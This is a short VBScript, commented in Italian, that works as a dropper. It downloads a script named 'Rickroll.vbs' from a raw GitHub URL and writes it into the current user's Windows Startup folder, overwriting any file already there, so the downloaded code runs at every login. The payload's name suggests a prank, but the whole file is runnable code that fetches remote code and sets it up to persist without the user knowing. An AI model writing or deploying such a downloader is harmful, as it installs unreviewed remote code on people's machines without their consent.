Option Explicit

Dim objFSO, objShell, strUserProfile, strTargetDirectory, strFilePath, objFile

Set objFSO = CreateObject("Scripting.FileSystemObject")

Set objShell = CreateObject("WScript.Shell")

' ottenere path utente 
strUserProfile = objShell.ExpandEnvironmentStrings("%USERPROFILE%")

' nome della directory
strTargetDirectory = strUserProfile & "\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"

' path del File
strFilePath = strTargetDirectory & "\script.vbs"


dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
dim bStrm: Set bStrm = createobject("Adodb.Stream")
xHttp.Open "GET", "https://raw.githubusercontent.com/W1nter-dev/TestVbs/main/Rickroll.vbs", False
xHttp.Send

with bStrm
    .type = 1 '//binary
    .open
    .write xHttp.responseBody
    .savetofile strFilePath, 2 '//overwrite
end with

Set objFile = Nothing
Set objFSO = Nothing
Set objShell = Nothing
